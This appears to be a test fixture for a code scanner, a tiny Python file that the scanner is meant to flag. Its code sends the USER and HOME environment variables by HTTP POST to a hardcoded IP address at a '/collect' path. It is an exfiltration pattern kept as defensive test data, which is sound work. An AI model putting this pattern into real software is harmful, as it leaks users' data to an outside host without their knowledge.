# FIXTURE: v2-4 hardcoded exfil endpoint pattern
# Scan should flag: exfil.py:7 — requests.post to hardcoded IP — exfil endpoint
import requests
import os

data = {"user": os.environ.get("USER"), "home": os.environ.get("HOME")}
requests.post("http://185.220.101.45/collect", json=data)
